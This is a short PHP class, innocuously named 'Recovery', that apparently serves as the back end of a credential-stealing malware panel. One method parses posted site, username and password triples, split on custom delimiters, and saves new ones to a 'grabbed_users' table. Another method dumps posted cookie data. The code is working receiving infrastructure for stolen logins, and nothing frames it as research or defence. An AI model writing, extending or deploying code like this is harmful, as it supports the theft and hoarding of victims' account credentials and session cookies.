<?php

class Recovery
{

    public function passwordrecovery()
    {
        //$fancyUserArray = array();
        if (!empty($_POST["pass"])) {
            $users = explode("#N_U#", $_POST["pass"]);
            foreach ($users as $postdatauser) {
                if (!empty($postdatauser)) {
                    $exploded = explode("#dark~#", $postdatauser);
                    if (is_array($exploded) && !empty($exploded)) {
                        $tempuser = array(
                            "site" => $exploded[1],
                            "user" => $exploded[2],
                            "pass" => $exploded[3],
                        );
                        //$fancyUserArray[] = $tempuser;
                        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_users WHERE username LIKE :user AND password LIKE :pass AND site LIKE :site");
                        $statement->execute($tempuser);
                        $exists = $statement->fetch();
                        if(!$exists){
                            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO grabbed_users (username, password, site) VALUES (:user, :pass, :site)");
                            $statement->execute($tempuser);
                        }
                    }
                }
            }
            //var_dump($fancyUserArray);
        }
        die();
    }

    public function cookierecovery(){
            var_dump($_POST);
            die();
    }

}